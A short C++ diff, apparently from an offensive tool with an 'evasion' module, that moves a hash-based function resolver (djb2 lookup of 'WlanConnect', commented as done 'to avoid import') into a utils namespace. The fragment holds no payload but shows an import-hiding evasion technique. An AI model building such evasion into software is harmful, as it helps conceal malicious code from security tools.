@@ -13,6 +13,7 @@
 #include <thread>
 #include <winternl.h>
 #include "../fs/FileSystem.h"
+#include "../utils/Shared.h"
 #include "../evasion/Syscalls.h"
 
 #pragma comment(lib, "wlanapi.lib")
@@ -172,7 +173,7 @@ namespace wifi {
         // Dynamic resolve to avoid import
         typedef DWORD (WINAPI *pWlanConnect)(HANDLE, const GUID*, const WLAN_CONNECTION_PARAMETERS*, PVOID);
         HMODULE hWlan = LoadLibraryA("wlanapi.dll");
-        pWlanConnect pConnect = (pWlanConnect)evasion::getProcByHash(hWlan, evasion::djb2Hash("WlanConnect"));
+        pWlanConnect pConnect = (pWlanConnect)utils::getProcByHash(hWlan, utils::djb2Hash("WlanConnect"));
         if (!pConnect) return false;
 
         HANDLE hClient = NULL;
